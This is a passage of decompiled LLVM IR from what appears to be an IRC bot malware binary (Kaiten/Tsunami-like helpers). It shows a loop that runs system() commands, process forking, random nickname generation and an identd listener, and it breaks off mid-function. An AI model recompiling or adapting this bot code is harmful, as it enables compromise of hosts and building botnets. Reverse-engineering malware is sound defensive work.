dec_label_pc_1000024c:                            ; preds = %dec_label_pc_10000320, %entry
  br label %dec_label_pc_10000258

dec_label_pc_10000258:                            ; preds = %dec_label_pc_1000024c, %dec_label_pc_10000258
  %storemerge34 = phi i32 [ 0, %dec_label_pc_1000024c ], [ %v1_1000030c, %dec_label_pc_10000258 ]
  store i8* inttoptr (i32 1886087532 to i8*), i8** %stack_var_-100, align 4
  %v1_10000288 = mul i32 %storemerge34, 4
  %v2_1000028c = add i32 %v1_10000288, ptrtoint ([247 x i8*]* @global_var_1001d064.258 to i32)
  %v1_10000290 = inttoptr i32 %v2_1000028c to i32*
  %v2_10000290 = load i32, i32* %v1_10000290, align 4
  store i32 %v2_10000290, i32* @r4, align 4
  %v3_100002a0 = call i32 @strcat(i8* %v2_100002a0, i32 %v2_10000290)
  store i32 268436144, i32* @lr, align 4
  %v1_100002ac = call i32 @__libc_system(i32 %v2_10000258)
  store i8* inttoptr (i32 1802071148 to i8*), i8** %stack_var_-100, align 4
  %v2_100002e8 = load i32, i32* %v1_10000290, align 4
  store i32 %v2_100002e8, i32* @r4, align 4
  %v3_100002f8 = call i32 @strcat(i8* %v2_100002a0, i32 %v2_100002e8)
  store i32 268436232, i32* @lr, align 4
  %v1_10000304 = call i32 @__libc_system(i32 %v2_10000258)
  %v1_1000030c = add nuw nsw i32 %storemerge34, 1
  %tmp12 = icmp slt i32 %v1_1000030c, 9
  br i1 %tmp12, label %dec_label_pc_10000258, label %dec_label_pc_10000320

dec_label_pc_10000320:                            ; preds = %dec_label_pc_10000258
  store i32 268436264, i32* @lr, align 4
  %v1_10000324 = call i32 @sleep(i32 5)
  br label %dec_label_pc_1000024c

; uselistorder directives
  uselistorder i32 %storemerge34, { 1, 0 }
  uselistorder i32* %stack_var_-112, { 1, 0 }
  uselistorder i8** %stack_var_-100, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @__libc_system, { 1, 0 }
  uselistorder label %dec_label_pc_10000258, { 1, 0 }
}

define i32 @strwildmatch(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %v2_10000350 = load i8, i8* %arg1, align 1
  %v3_10000360 = icmp eq i8 %v2_10000350, 42
  br i1 %v3_10000360, label %dec_label_pc_10000398, label %dec_label_pc_10000368

dec_label_pc_10000368:                            ; preds = %entry
  %v3_1000036c = icmp eq i8 %v2_10000350, 63
  br i1 %v3_1000036c, label %dec_label_pc_1000040c, label %dec_label_pc_10000374

dec_label_pc_10000374:                            ; preds = %dec_label_pc_10000368
  %v3_10000378 = icmp eq i8 %v2_10000350, 0
  br i1 %v3_10000378, label %dec_label_pc_10000384, label %dec_label_pc_10000468

dec_label_pc_10000384:                            ; preds = %dec_label_pc_10000374
  %v2_10000388 = load i8, i8* %tmp, align 1
  %v3_10000388 = zext i8 %v2_10000388 to i32
  br label %dec_label_pc_100004ec

dec_label_pc_10000398:                            ; preds = %entry
  %v2_1000039c = add i32 %tmp9, 1
  store i32 268436396, i32* @lr, align 4
  %v5_100003a8 = inttoptr i32 %v2_1000039c to i8*
  %v6_100003a8 = call i32 @strwildmatch(i8* %v5_100003a8, i32 %arg2, i32 %tmp9)
  %v3_100003b0 = icmp eq i32 %v6_100003a8, 0
  br i1 %v3_100003b0, label %dec_label_pc_100003f8, label %dec_label_pc_100003b8

dec_label_pc_100003b8:                            ; preds = %dec_label_pc_10000398
  %v2_100003bc = load i8, i8* %tmp, align 1
  %v3_100003c4 = icmp eq i8 %v2_100003bc, 0
  br i1 %v3_100003c4, label %dec_label_pc_10000400, label %dec_label_pc_100003cc

dec_label_pc_100003cc:                            ; preds = %dec_label_pc_100003b8
  %v2_100003d0 = add i32 %arg2, 1
  store i32 268436448, i32* @lr, align 4
  %v6_100003dc = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v2_100003d0, i32 %arg2)
  %v3_100003e4 = icmp eq i32 %v6_100003dc, 0
  br i1 %v3_100003e4, label %dec_label_pc_100003f8, label %dec_label_pc_10000400

dec_label_pc_100003f8:                            ; preds = %dec_label_pc_100003cc, %dec_label_pc_10000398
  br label %dec_label_pc_10000400

dec_label_pc_10000400:                            ; preds = %dec_label_pc_100003b8, %dec_label_pc_100003cc, %dec_label_pc_100003f8
  %storemerge4 = phi i32 [ 0, %dec_label_pc_100003f8 ], [ 1, %dec_label_pc_100003cc ], [ 1, %dec_label_pc_100003b8 ]
  br label %dec_label_pc_100004ec

dec_label_pc_1000040c:                            ; preds = %dec_label_pc_10000368
  %v2_10000410 = load i8, i8* %tmp, align 1
  %v3_10000418 = icmp eq i8 %v2_10000410, 0
  br i1 %v3_10000418, label %dec_label_pc_1000045c, label %dec_label_pc_10000420

dec_label_pc_10000420:                            ; preds = %dec_label_pc_1000040c
  %v1_10000424 = add i32 %tmp9, 1
  %v2_1000042c = add i32 %arg2, 1
  store i32 268436540, i32* @lr, align 4
  %v4_10000438 = inttoptr i32 %v1_10000424 to i8*
  %v5_10000438 = call i32 @strwildmatch(i8* %v4_10000438, i32 %v2_1000042c, i32 %arg2)
  %v3_10000440 = icmp ne i32 %v5_10000438, 0
  %. = zext i1 %v3_10000440 to i32
  br label %dec_label_pc_1000045c

dec_label_pc_1000045c:                            ; preds = %dec_label_pc_10000420, %dec_label_pc_1000040c
  %storemerge3 = phi i32 [ 1, %dec_label_pc_1000040c ], [ %., %dec_label_pc_10000420 ]
  br label %dec_label_pc_100004ec

dec_label_pc_10000468:                            ; preds = %dec_label_pc_10000374
  %v3_1000046c = load i8, i8* %arg1, align 1
  %v4_1000046c = zext i8 %v3_1000046c to i32
  store i32 268436608, i32* @lr, align 4
  %v3_1000047c = call i32 @__GI_toupper(i32 %v4_1000046c, i32 %tmp9)
  %v3_10000488 = load i8, i8* %tmp, align 1
  %v4_10000488 = zext i8 %v3_10000488 to i32
  store i32 268436636, i32* @lr, align 4
  %v3_10000498 = call i32 @__GI_toupper(i32 %v4_10000488, i32 %arg2)
  %v4_100004a0 = icmp eq i32 %v3_1000047c, %v3_10000498
  br i1 %v4_100004a0, label %dec_label_pc_100004a8, label %dec_label_pc_100004e4

dec_label_pc_100004a8:                            ; preds = %dec_label_pc_10000468
  %v1_100004ac = add i32 %tmp9, 1
  %v2_100004b4 = add i32 %arg2, 1
  store i32 268436676, i32* @lr, align 4
  %v4_100004c0 = inttoptr i32 %v1_100004ac to i8*
  %v5_100004c0 = call i32 @strwildmatch(i8* %v4_100004c0, i32 %v2_100004b4, i32 %arg2)
  %v3_100004c8 = icmp ne i32 %v5_100004c0, 0
  %.8 = zext i1 %v3_100004c8 to i32
  br label %dec_label_pc_100004e4

dec_label_pc_100004e4:                            ; preds = %dec_label_pc_100004a8, %dec_label_pc_10000468
  %storemerge = phi i32 [ 1, %dec_label_pc_10000468 ], [ %.8, %dec_label_pc_100004a8 ]
  br label %dec_label_pc_100004ec

dec_label_pc_100004ec:                            ; preds = %dec_label_pc_1000045c, %dec_label_pc_10000400, %dec_label_pc_10000384, %dec_label_pc_100004e4
  %stack_var_-36.0 = phi i32 [ %storemerge4, %dec_label_pc_10000400 ], [ %storemerge3, %dec_label_pc_1000045c ], [ %v3_10000388, %dec_label_pc_10000384 ], [ %storemerge, %dec_label_pc_100004e4 ]
  ret i32 %stack_var_-36.0

; uselistorder directives
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32)* @__GI_toupper, { 1, 0 }
  uselistorder i32 %arg2, { 5, 6, 7, 3, 4, 0, 1, 2, 8 }
  uselistorder label %dec_label_pc_100004ec, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10000400, { 2, 1, 0 }
}

define i32 @Send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg5, i32* @r7, align 4
  %stack_var_-136 = alloca i32, align 4
  store i32 2, i32* %stack_var_-136, align 4
  store i32 ptrtoint (i32* @global_var_1001d8bc.262 to i32), i32* @r3, align 4
  %v2_10000594 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268436896, i32* @lr, align 4
  %v4_1000059c = call i32 @vsprintf(i32 ptrtoint (i32* @global_var_1001d8bc.262 to i32), i32 %arg2, i32 %v2_10000594, i32 268566528)
  store i32 ptrtoint (i32* @global_var_1001d8bc.262 to i32), i32* @r3, align 4
  %v0_100005a8 = call i32 @__GI_strlen()
  store i32 268436932, i32* @lr, align 4
  %v2_100005c0 = call i32 @__libc_write(i32 %arg1, i32 ptrtoint (i32* @global_var_1001d8bc.262 to i32))
  ret i32 %v2_100005c0

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1001d8bc.262 to i32), { 1, 2, 0, 3 }
}

define i32 @host2ip(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 268437000, i32* @lr, align 4
  %v1_10000604 = call i32 @inet_addr(i32 %arg2)
  store i32 %v1_10000604, i32* @global_var_1001d828.263, align 4
  %v4_10000620 = icmp eq i32 %v1_10000604, -1
  br i1 %v4_10000620, label %dec_label_pc_10000628, label %dec_label_pc_10000678

dec_label_pc_10000628:                            ; preds = %entry
  store i32 268437040, i32* @lr, align 4
  %v2_1000062c = call i32 @__GI_gethostbyname(i32 %arg2, i32 -1)
  %v3_1000063c = icmp eq i32 %v2_1000062c, 0
  br i1 %v3_1000063c, label %dec_label_pc_10000644, label %dec_label_pc_1000064c

dec_label_pc_10000644:                            ; preds = %dec_label_pc_10000628
  %v0_10000648 = call i32 @__GI_exit()
  br label %dec_label_pc_1000064c

dec_label_pc_1000064c:                            ; preds = %dec_label_pc_10000628, %dec_label_pc_10000644
  %v1_10000650 = add i32 %v2_1000062c, 16
  %v2_10000650 = inttoptr i32 %v1_10000650 to i32*
  %v3_10000650 = load i32, i32* %v2_10000650, align 4
  %v1_10000654 = inttoptr i32 %v3_10000650 to i32*
  %v2_10000654 = load i32, i32* %v1_10000654, align 4
  %v1_10000664 = add i32 %v2_1000062c, 12
  %v2_10000664 = inttoptr i32 %v1_10000664 to i32*
  %v3_10000664 = load i32, i32* %v2_10000664, align 4
  store i32 %v3_10000664, i32* @r5, align 4
  store i32 268437112, i32* @lr, align 4
  %v4_10000674 = call i32 @bcopy(i32 %v2_10000654, i32 ptrtoint (i32* @global_var_1001d828.263 to i32), i32 %v3_10000664, i32 %v2_1000062c)
  %v3_1000067c.pre = load i32, i32* @global_var_1001d828.263, align 4
  br label %dec_label_pc_10000678

dec_label_pc_10000678:                            ; preds = %entry, %dec_label_pc_1000064c
  %v3_1000067c = phi i32 [ %v1_10000604, %entry ], [ %v3_1000067c.pre, %dec_label_pc_1000064c ]
  ret i32 %v3_1000067c

; uselistorder directives
  uselistorder i32 %v3_10000664, { 1, 0 }
  uselistorder i32 %v2_1000062c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10000678, { 1, 0 }
  uselistorder label %dec_label_pc_1000064c, { 1, 0 }
}

define i32 @mfork(i32 %arg1) local_unnamed_addr {
entry:
  %v3_100006b8 = load i8, i8* @global_var_1001d818.264, align 1
  %v3_100006c0 = icmp eq i8 %v3_100006b8, 1
  br i1 %v3_100006c0, label %dec_label_pc_100006c8, label %dec_label_pc_100006d4

dec_label_pc_100006c8:                            ; preds = %entry
  br label %dec_label_pc_100007d8

dec_label_pc_100006d4:                            ; preds = %entry
  store i32 268437208, i32* @lr, align 4
  %v0_100006d4 = call i32 @__libc_fork()
  %v3_100006e4 = icmp eq i32 %v0_100006d4, 0
  br i1 %v3_100006e4, label %dec_label_pc_100006ec, label %dec_label_pc_100006f8

dec_label_pc_100006ec:                            ; preds = %dec_label_pc_100006d4
  br label %dec_label_pc_100007d8

dec_label_pc_100006f8:                            ; preds = %dec_label_pc_100006d4
  %v3_100006fc = load i32, i32* @global_var_1001d824.265, align 4
  %v1_10000700 = add i32 %v3_100006fc, 1
  store i32 %v1_10000700, i32* @global_var_1001d824.265, align 4
  %v1_10000714 = mul i32 %v1_10000700, 4
  %v1_10000718 = add i32 %v1_10000714, 4
  store i32 %v1_10000718, i32* @r3, align 4
  store i32 268437284, i32* @lr, align 4
  %v0_10000720 = call i32 @malloc()
  %v3_1000077c2 = load i32, i32* @global_var_1001d824.265, align 4
  %v3_100007884 = icmp eq i32 %v3_1000077c2, 1
  br i1 %v3_100007884, label %dec_label_pc_10000790, label %dec_label_pc_10000738

dec_label_pc_10000738:                            ; preds = %dec_label_pc_100006f8, %dec_label_pc_10000738
  %storemerge16 = phi i32 [ %v1_10000770, %dec_label_pc_10000738 ], [ 0, %dec_label_pc_100006f8 ]
  %v1_1000073c = mul i32 %storemerge16, 4
  %v2_10000748 = add i32 %v1_1000073c, %v0_10000720
  %v3_1000075c = load i32, i32* @global_var_1001d850.266, align 4
  %v2_10000760 = add i32 %v3_1000075c, %v1_1000073c
  %v1_10000764 = inttoptr i32 %v2_10000760 to i32*
  %v2_10000764 = load i32, i32* %v1_10000764, align 4
  %v2_10000768 = inttoptr i32 %v2_10000748 to i32*
  store i32 %v2_10000764, i32* %v2_10000768, align 4
  %v1_10000770 = add i32 %storemerge16, 1
  %v3_1000077c = load i32, i32* @global_var_1001d824.265, align 4
  %v1_10000780 = add i32 %v3_1000077c, -1
  %v3_10000788 = icmp ugt i32 %v1_10000780, %v1_10000770
  br i1 %v3_10000788, label %dec_label_pc_10000738, label %dec_label_pc_10000778.dec_label_pc_10000790_crit_edge

dec_label_pc_10000778.dec_label_pc_10000790_crit_edge: ; preds = %dec_label_pc_10000738
  br label %dec_label_pc_10000790

dec_label_pc_10000790:                            ; preds = %dec_label_pc_100006f8, %dec_label_pc_10000778.dec_label_pc_10000790_crit_edge
  %v3_10000794 = phi i32 [ %v3_1000077c, %dec_label_pc_10000778.dec_label_pc_10000790_crit_edge ], [ %v3_1000077c2, %dec_label_pc_100006f8 ]
  %v1_10000798 = mul i32 %v3_10000794, 4
  %v2_100007a4 = add i32 %v0_10000720, -4
  %v1_100007a8 = add i32 %v2_100007a4, %v1_10000798
  %v2_100007b0 = inttoptr i32 %v1_100007a8 to i32*
  store i32 %v0_100006d4, i32* %v2_100007b0, align 4
  %v3_100007b8 = load i32, i32* @global_var_1001d850.266, align 4
  store i32 %v3_100007b8, i32* @r3, align 4
  store i32 268437444, i32* @lr, align 4
  %v0_100007c0 = call i32 @free()
  store i32 %v0_10000720, i32* @global_var_1001d850.266, align 4
  br label %dec_label_pc_100007d8

dec_label_pc_100007d8:                            ; preds = %dec_label_pc_100006ec, %dec_label_pc_100006c8, %dec_label_pc_10000790
  %stack_var_-20.0 = phi i32 [ 1, %dec_label_pc_100006c8 ], [ 0, %dec_label_pc_100006ec ], [ %v0_100006d4, %dec_label_pc_10000790 ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 %v1_10000770, { 1, 0 }
  uselistorder i32 %v1_1000073c, { 1, 0 }
  uselistorder i32 %storemerge16, { 1, 0 }
  uselistorder i32 %v3_1000077c2, { 1, 0 }
  uselistorder i32 %v0_10000720, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100007d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000790, { 1, 0 }
  uselistorder label %dec_label_pc_10000738, { 1, 0 }
}

define i32 @filter(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1000084c = add i32 %arg1, -1
  br label %dec_label_pc_10000838

dec_label_pc_10000814:                            ; preds = %dec_label_pc_10000864, %dec_label_pc_10000838
  store i32 %arg1, i32* @r3, align 4
  %v0_10000818 = call i32 @__GI_strlen()
  %v1_1000082c = add i32 %v0_10000818, %v2_1000084c
  %v3_10000834 = inttoptr i32 %v1_1000082c to i8*
  store i8 0, i8* %v3_10000834, align 1
  br label %dec_label_pc_10000838

dec_label_pc_10000838:                            ; preds = %entry, %dec_label_pc_10000814
  store i32 %arg1, i32* @r3, align 4
  %v0_1000083c = call i32 @__GI_strlen()
  %v1_10000850 = add i32 %v0_1000083c, %v2_1000084c
  %v1_10000854 = inttoptr i32 %v1_10000850 to i8*
  %v2_10000854 = load i8, i8* %v1_10000854, align 1
  %v3_1000085c = icmp eq i8 %v2_10000854, 13
  br i1 %v3_1000085c, label %dec_label_pc_10000814, label %dec_label_pc_10000864

dec_label_pc_10000864:                            ; preds = %dec_label_pc_10000838
  store i32 %arg1, i32* @r3, align 4
  %v0_10000868 = call i32 @__GI_strlen()
  %v1_1000087c = add i32 %v0_10000868, %v2_1000084c
  %v1_10000880 = inttoptr i32 %v1_1000087c to i8*
  %v2_10000880 = load i8, i8* %v1_10000880, align 1
  %v3_10000888 = icmp eq i8 %v2_10000880, 10
  br i1 %v3_10000888, label %dec_label_pc_10000814, label %dec_label_pc_10000890

dec_label_pc_10000890:                            ; preds = %dec_label_pc_10000864
  ret i32 %v0_10000868

; uselistorder directives
  uselistorder i32 %arg1, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10000838, { 1, 0 }
}

define i32 @makestring(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-1072 = alloca i32, align 4
  store i32 268437700, i32* @lr, align 4
  %v0_100008c0 = call i32 @random()
  %v2_100008dc = srem i32 %v0_100008c0, 5
  %v1_100008f8 = add nsw i32 %v2_100008dc, 4
  %v1_10000904 = add nsw i32 %v2_100008dc, 5
  store i32 %v1_10000904, i32* @r3, align 4
  store i32 268437776, i32* @lr, align 4
  %v0_1000090c = call i32 @malloc()
  store i32 268437816, i32* @lr, align 4
  %v3_10000934 = call i32 @__GI_memset(i32 %v0_1000090c, i32 0, i32 %v1_10000904)
  store i32 268437836, i32* @lr, align 4
  %v3_10000948 = call i32 @__GI_fopen(i32 ptrtoint ([16 x i8]* @global_var_1000b7f4.267 to i32), i32 ptrtoint (i32* @global_var_1000b804.268 to i32))
  %v3_10000958 = icmp eq i32 %v3_10000948, 0
  br i1 %v3_10000958, label %dec_label_pc_100009d0.preheader, label %dec_label_pc_100009e4

dec_label_pc_100009d0.preheader:                  ; preds = %entry
  %v2_100009d88 = icmp sgt i32 %v2_100008dc, -4
  br i1 %v2_100009d88, label %dec_label_pc_1000096c, label %dec_label_pc_10000ad4

dec_label_pc_1000096c:                            ; preds = %dec_label_pc_100009d0.preheader, %dec_label_pc_1000096c
  %storemerge711 = phi i32 [ %v1_100009c8, %dec_label_pc_1000096c ], [ 0, %dec_label_pc_100009d0.preheader ]
  store i32 268437888, i32* @lr, align 4
  %v0_1000097c = call i32 @random()
  %v2_10000998 = srem i32 %v0_1000097c, 26
  %fold = add nsw i32 %v2_10000998, 65
  %v1_100009c0 = trunc i32 %fold to i8
  %v2_100009c0 = load i32, i32* @r29, align 4
  %v3_100009c0 = inttoptr i32 %v2_100009c0 to i8*
  store i8 %v1_100009c0, i8* %v3_100009c0, align 1
  %v1_100009c8 = add nuw nsw i32 %storemerge711, 1
  %v2_100009d8 = icmp slt i32 %v1_100009c8, %v1_100008f8
  br i1 %v2_100009d8, label %dec_label_pc_1000096c, label %dec_label_pc_10000ad4

dec_label_pc_100009e4:                            ; preds = %entry
  store i32 268437992, i32* @lr, align 4
  %v0_100009e4 = call i32 @random()
  store i32 268438000, i32* @lr, align 4
  %v0_100009ec = call i32 @random()
  %v0_100009f4 = load i32, i32* @r29, align 4
  %v2_100009f4 = mul i32 %v0_100009f4, %v0_100009ec
  %v2_10000a10 = srem i32 %v2_100009f4, 45402
  %v2_10000a7012 = icmp sgt i32 %v2_10000a10, -1
  %v2_10000a48 = ptrtoint i32* %stack_var_-1072 to i32
  br i1 %v2_10000a7012, label %dec_label_pc_10000a48, label %dec_label_pc_10000a78

dec_label_pc_10000a48:                            ; preds = %dec_label_pc_100009e4, %dec_label_pc_10000a48
  %storemerge615 = phi i32 [ %v1_10000a60, %dec_label_pc_10000a48 ], [ 0, %dec_label_pc_100009e4 ]
  store i32 268438108, i32* @lr, align 4
  %v3_10000a58 = call i32 @fgets(i32 %v2_10000a48, i32 1024, i32 %v3_10000948)
  %v1_10000a60 = add nuw nsw i32 %storemerge615, 1
  %v2_10000a70 = icmp slt i32 %storemerge615, %v2_10000a10
  br i1 %v2_10000a70, label %dec_label_pc_10000a48, label %dec_label_pc_10000a78

dec_label_pc_10000a78:                            ; preds = %dec_label_pc_10000a48, %dec_label_pc_100009e4
  store i32 268438160, i32* @lr, align 4
  %v3_10000a8c = call i32 @__GI_memset(i32 %v2_10000a48, i32 0, i32 1024)
  store i32 268438180, i32* @lr, align 4
  %v3_10000aa0 = call i32 @fgets(i32 %v2_10000a48, i32 1024, i32 %v3_10000948)
  store i32 268438192, i32* @lr, align 4
  %v1_10000aac = call i32 @filter(i32 %v2_10000a48)
  store i32 %v0_1000090c, i32* @r3, align 4
  store i32 %v2_10000a48, i32* @r4, align 4
  store i32 %v1_100008f8, i32* @r5, align 4
  store i32 268438220, i32* @lr, align 4
  %v0_10000ac8 = call i32 @memcpy()
  store i32 268438228, i32* @lr, align 4
  %v1_10000ad0 = inttoptr i32 %v3_10000948 to i16*
  %v2_10000ad0 = call i32 @__GI_fclose(i16* %v1_10000ad0)
  br label %dec_label_pc_10000ad4

dec_label_pc_10000ad4:                            ; preds = %dec_label_pc_1000096c, %dec_label_pc_100009d0.preheader, %dec_label_pc_10000a78
  ret i32 %v0_1000090c

; uselistorder directives
  uselistorder i32 %v1_100009c8, { 1, 0 }
  uselistorder i32 %v0_1000090c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000ad4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000a48, { 1, 0 }
  uselistorder label %dec_label_pc_1000096c, { 1, 0 }
}

define i32 @identd() local_unnamed_addr {
entry:
  %stack_var_-1180 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-1240 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-1216 = alloca i32, align 4
  %stack_var_-1196 = alloca i32, align 4
  %stack_var_-1204 = alloca i32, align 4
  %stack_var_-1212 = alloca i32, align 4
  store i32 268438300, i32* @lr, align 4
  %v3_10000b18 = call i32 @socket(i32 2, i32 1, i32 0)
  %v4_10000b2c = icmp eq i32 %v3_10000b18, -1
  br i1 %v4_10000b2c, label %dec_label_pc_10000e54, label %dec_label_pc_10000b34

dec_label_pc_10000b34:                            ; preds = %entry
  store i32 2, i32* %stack_var_-1212, align 4
  store i32 113, i32* @r3, align 4
  %v1_10000b40 = call i32 @htons(i32 113)
  %v2_10000b54 = ptrtoint i32* %stack_var_-1212 to i32
  %v2_10000b58 = ptrtoint i32* %stack_var_-1204 to i32
  store i32 0, i32* %stack_var_-1204, align 4
  store i32 268438400, i32* @lr, align 4
  %v4_10000b7c = call i32 @bind(i32 %v3_10000b18, i32 %v2_10000b54, i32 16, i32 %v2_10000b58)
  %v4_10000b88 = icmp eq i32 %v4_10000b7c, -1
  br i1 %v4_10000b88, label %dec_label_pc_10000e54, label %dec_label_pc_10000b90

dec_label_pc_10000b90:                            ; preds = %dec_label_pc_10000b34
  store i32 268438428, i32* @lr, align 4
  %v3_10000b98 = call i32 @listen(i32 %v3_10000b18, i32 1, i32 %v4_10000b7c)
  %v4_10000ba4 = icmp eq i32 %v3_10000b98, -1
  br i1 %v4_10000ba4, label %dec_label_pc_10000e54, label %dec_label_pc_10000bac

dec_label_pc_10000bac:                            ; preds = %dec_label_pc_10000b90
  store i32 268438448, i32* @lr, align 4
  %v0_10000bac = call i32 @__libc_fork()
  %v3_10000bb4 = icmp eq i32 %v0_10000bac, 0
  br i1 %v3_10000bb4, label %dec_label_pc_10000e54, label %dec_label_pc_10000bbc

dec_label_pc_10000bbc:                            ; preds = %dec_label_pc_10000bac
  store i32 16, i32* %stack_var_-1216, align 4
  %v2_10000bc4 = ptrtoint i32* %stack_var_-1196 to i32
  %v2_10000bc8 = ptrtoint i32* %stack_var_-1216 to i32
  store i32 268438492, i32* @lr, align 4
  %v4_10000bd8 = call i32 @__libc_accept(i32 %v3_10000b18, i32 %v2_10000bc4, i32 %v2_10000bc8, i32 %v2_10000bc8)
  %v4_10000bec = icmp eq i32 %v4_10000bd8, -1
  br i1 %v4_10000bec, label %dec_label_pc_10000bf4, label %dec_label_pc_10000bfc.preheader

dec_label_pc_10000bf4:                            ; preds = %dec_label_pc_10000bbc
  %v0_10000bf8 = call i32 @__GI_exit()
  br label %dec_label_pc_10000bfc.preheader

dec_label_pc_10000bfc.preheader:                  ; preds = %dec_label_pc_10000bf4, %dec_label_pc_10000bbc
  %v2_10000bfc = ptrtoint i32* %stack_var_-148 to i32
  %v1_10000c44 = udiv i32 %v4_10000bd8, 32
  %v1_10000c4c = mul nuw nsw i32 %v1_10000c44, 4
  %v2_10000c50 = ptrtoint i32* %stack_var_-1240 to i32
  %v2_10000c54 = add i32 %v2_10000c50, 1092
  %v1_10000c58 = add i32 %v2_10000c54, %v1_10000c4c
  %v1_10000c5c = inttoptr i32 %v1_10000c58 to i32*
  %v1_10000c64 = urem i32 %v4_10000bd8, 32
  %v3_10000c6c = shl i32 1, %v1_10000c64
  %v1_10000c9c = add i32 %v4_10000bd8, 1
  %v2_10000ca4 = ptrtoint i32* %stack_var_-156 to i32
  %v3_10000cf8 = sub i32 0, %v4_10000bd8
  %v4_10000cf8 = urem i32 %v3_10000cf8, 32
  %v6_10000cf8 = xor i32 %v4_10000cf8, 31
  %v12_10000cf8 = lshr i32 -1, %v1_10000c64
  %v16_10000cf8 = xor i32 %v12_10000cf8, 1
  %v14_10000cf8 = urem i32 %v12_10000cf8, 2
  br label %dec_label_pc_10000bfc

dec_label_pc_10000bfc:                            ; preds = %dec_label_pc_10000bfc.preheader, %dec_label_pc_10000cd4
  store i32 %v2_10000bfc, i32* %stack_var_-1240, align 4
  store i32 0, i32* %stack_var_-148, align 4
  br label %dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge

dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge: ; preds = %dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge.dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge_crit_edge, %dec_label_pc_10000bfc
  %v3_10000c14.pre = phi i32 [ %v2_10000bfc, %dec_label_pc_10000bfc ], [ %v3_10000c14.pre.pre, %dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge.dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge_crit_edge ]
  %v1_10000c2c30 = phi i32 [ 1, %dec_label_pc_10000bfc ], [ %v1_10000c2c, %dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge.dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge_crit_edge ]
  %v1_10000c18 = mul nuw nsw i32 %v1_10000c2c30, 4
  %v2_10000c1c = add i32 %v1_10000c18, %v3_10000c14.pre
  %v2_10000c24 = inttoptr i32 %v2_10000c1c to i32*
  store i32 0, i32* %v2_10000c24, align 4
  %v1_10000c2c = add nuw nsw i32 %v1_10000c2c30, 1
  %tmp25 = icmp ult i32 %v1_10000c2c, 32
  br i1 %tmp25, label %dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge.dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge_crit_edge, label %dec_label_pc_10000c40

dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge.dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge_crit_edge: ; preds = %dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge
  %v3_10000c14.pre.pre = load i32, i32* %stack_var_-1240, align 4
  br label %dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge

dec_label_pc_10000c40:                            ; preds = %dec_label_pc_10000c10.dec_label_pc_10000c10_crit_edge
  %v2_10000c5c = load i32, i32* %v1_10000c5c, align 4
  %v2_10000c70 = or i32 %v2_10000c5c, %v3_10000c6c
  store i32 %v2_10000c70, i32* %v1_10000c5c, align 4
  store i32 60, i32* %stack_var_-156, align 4
  store i32 268438720, i32* @lr, align 4
  %v6_10000cbc = call i32 @__libc_select(i32 %v1_10000c9c, i32 %v2_10000bfc, i32 0, i32 0, i32 %v2_10000ca4, i32 %v2_10000bfc)
  %tmp26 = icmp sgt i32 %v6_10000cbc, -1
  br i1 %tmp26, label %dec_label_pc_10000cd4, label %dec_label_pc_10000ccc

dec_label_pc_10000ccc:                            ; preds = %dec_label_pc_10000c40
  %v0_10000cd0 = call i32 @__GI_exit()
  br label %dec_label_pc_10000cd4

dec_label_pc_10000cd4:                            ; preds = %dec_label_pc_10000c40, %dec_label_pc_10000ccc
  %v2_10000cec = load i32, i32* %v1_10000c5c, align 4
  %v5_10000cf8 = shl i32 %v2_10000cec, %v4_10000cf8
  %v7_10000cf8 = lshr i32 %v2_10000cec, %v6_10000cf8
  %v8_10000cf8 = udiv i32 %v7_10000cf8, 2
  %v9_10000cf8 = or i32 %v8_10000cf8, %v5_10000cf8
  %tmp = icmp slt i32 %v2_10000cec, 0
  %v15_10000cf82 = zext i1 %tmp to i32
  %v17_10000cf8 = and i32 %v15_10000cf82, %v16_10000cf8
  %v14_10000cf8.masked = and i32 %v14_10000cf8, %v9_10000cf8
  %v1_10000d00 = or i32 %v14_10000cf8.masked, %v17_10000cf8
  %v3_10000d04 = icmp eq i32 %v1_10000d00, 0
  br i1 %v3_10000d04, label %dec_label_pc_10000bfc, label %dec_label_pc_10000d10

dec_label_pc_10000d10:                            ; preds = %dec_label_pc_10000cd4
  %v2_10000d10 = ptrtoint i32* %stack_var_-1180 to i32
  store i32 268438824, i32* @lr, align 4
  %v4_10000d24 = call i32 @__libc_recv(i32 %v4_10000bd8, i32 %v2_10000d10, i32 1024, i32 0)
  %tmp27 = icmp slt i32 %v4_10000d24, 1
